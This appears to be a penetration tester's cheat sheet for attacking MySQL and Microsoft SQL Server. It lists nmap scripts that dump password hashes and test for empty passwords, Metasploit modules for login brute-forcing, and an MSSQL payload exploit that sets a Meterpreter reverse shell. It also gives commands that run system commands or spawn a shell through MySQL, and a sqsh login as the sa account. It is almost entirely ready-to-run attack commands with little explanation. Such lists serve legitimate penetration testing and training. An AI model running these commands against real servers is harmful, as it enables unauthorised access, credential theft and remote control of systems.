### SQL

#### nmap 
- nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 [victim_ip] -p 3306
- nmap -sV -Pn -vv -script=mysql* [victim_ip] -p 3306
- nmap -sU --script=ms-sql-info [vicrim_ip] -p 3306

#### metasploit
- msf > use auxiliary/scanner/mssql/mssql_ping
- msf> use auxiliary/scanner/mssql/mssql_login
- msf> use exploit/windows/mssql/mssql_payload
  - set PAYLOAD windows/meterpreter/reverse_tcp

#### Run commands via mysql
- mysql> select do_system('id');
- mysql> \! sh

##### Gain shell using gathered credentials
- msf > use exploit/windows/mssql/mssql_payload
- msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp

#### mssql server config file
```
cat freetds.conf

host = $ip
port = 1433
tds version = 8.0
user=sa

root@kali:~/dirsearch# sqsh -S someserver -U sa -P PASS -D DB_NAME
```
